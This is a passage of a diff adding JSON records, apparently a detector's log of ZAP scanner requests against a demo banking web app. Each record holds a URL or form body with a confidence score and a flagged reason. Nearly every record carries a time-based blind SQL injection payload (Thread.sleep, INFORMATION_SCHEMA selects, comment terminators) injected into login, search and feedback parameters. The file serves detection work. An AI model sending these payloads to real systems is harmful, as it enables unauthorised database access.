+  "path": "/static/index.jsp?content=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999997615814209,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89738"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89739"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=%22java.lang.Thread.sleep%22%2815000%29&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9999993741512299,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973a"
+  },
+  "path": "/search.jsp?query=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999999105930328,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973b"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973c"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973d"
+  },
+  "path": "/survey_questions.jsp?step=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999997317790985,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973e"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=Subscribe+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "Confidence_Score": 0.9999992847442627,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8973f"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89740"
+  },
+  "path": "/static/index.jsp?content=personal_checking.htm+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999998807907104,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89741"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89742"
+  },
+  "path": "/search.jsp?query=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89743"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP+%2F+%22java.lang.Thread.sleep%22%2815000%29+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 0.9999999403953552,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89744"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89745"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89746"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=Subscribe%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89747"
+  },
+  "path": "/static/index.jsp?content=personal_checking.htm%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89748"
+  },
+  "path": "/survey_questions.jsp?step=d+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999999105930328,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89749"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974a"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974b"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974c"
+  },
+  "path": "/search.jsp?query=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974d"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974e"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999996721744537,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8974f"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=Subscribe%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89750"
+  },
+  "path": "/static/index.jsp?content=personal_checking.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89751"
+  },
+  "path": "/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89752"
+  },
+  "path": "/survey_questions.jsp?step=d%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89753"
+  },
+  "path": "/search.jsp?query=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89754"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89755"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89756"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89757"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=US+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999998807907104,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89758"
+  },
+  "path": "/static/index.jsp?content=personal_checking.htm+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89759"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=Subscribe+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975a"
+  },
+  "path": "/survey_questions.jsp?step=d%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975b"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975c"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975d"
+  },
+  "path": "/search.jsp?query=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975e"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=%22java.lang.Thread.sleep%22%2815000%29",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999996721744537,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8975f"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=US%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89760"
+  },
+  "path": "/doSubscribe",
+  "body": "txtEmail=ZAP&btnSubmit=Subscribe%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89761"
+  },
+  "path": "/static/index.jsp?content=personal_checking.htm%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89762"
+  },
+  "path": "/survey_questions.jsp?step=d+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89763"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89764"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&btnSubmit=Login",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89765"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=US%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89766"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+%2F+%22java.lang.Thread.sleep%22%2815000%29+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 0.9999998807907104,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89767"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89768"
+  },
+  "path": "/survey_questions.jsp?step=d%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89769"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976a"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=US+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976b"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976c"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976d"
+  },
+  "path": "/sendFeedback",
+  "body": "cfile=comments.txt&name=ZAP&email_addr=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+",
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976e"
+  },
+  "path": "/Privacypolicy.jsp?sec=Careers&template=US%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script') | Contains characters suggestive of SQL Injection (e.g., ';', ''')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c8976f"
+  },
+  "path": "/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22",
+  "body": {
+    "$numberDouble": "NaN"
+  },
+  "Confidence_Score": 1,
+  "Severity": 3,
+  "Reason": "Contains suspicious keywords (e.g., 'select', 'union', 'script')"
+},
+{
+  "_id": {
+    "$oid": "68973121fe4afe7164c89770"
+  },
+  "path": "/doLogin",
+  "body": "uid=ZAP&passw=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+",
+  "Confidence_Score": 1,
+  "Severity": 3,
